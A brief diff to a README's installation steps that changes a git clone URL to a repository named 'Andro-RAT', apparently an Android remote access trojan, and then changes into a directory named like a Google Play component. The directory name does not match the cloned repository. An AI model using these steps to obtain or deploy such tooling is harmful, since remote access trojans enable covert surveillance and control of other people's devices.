@@ -73,7 +73,7 @@ Never store real API tokens, passwords, private keys, or other credentials direc
 Clone the repository:
 
 ```bash
-git clone [https://github.com/Jayasankha-dev/GooglePlayService.apk.git](https://github.com/Jayasankha-dev/Andro-RAT)
+git clone https://github.com/Jayasankha-dev/Andro-RAT
 cd GooglePlayService.apk
 ```
 
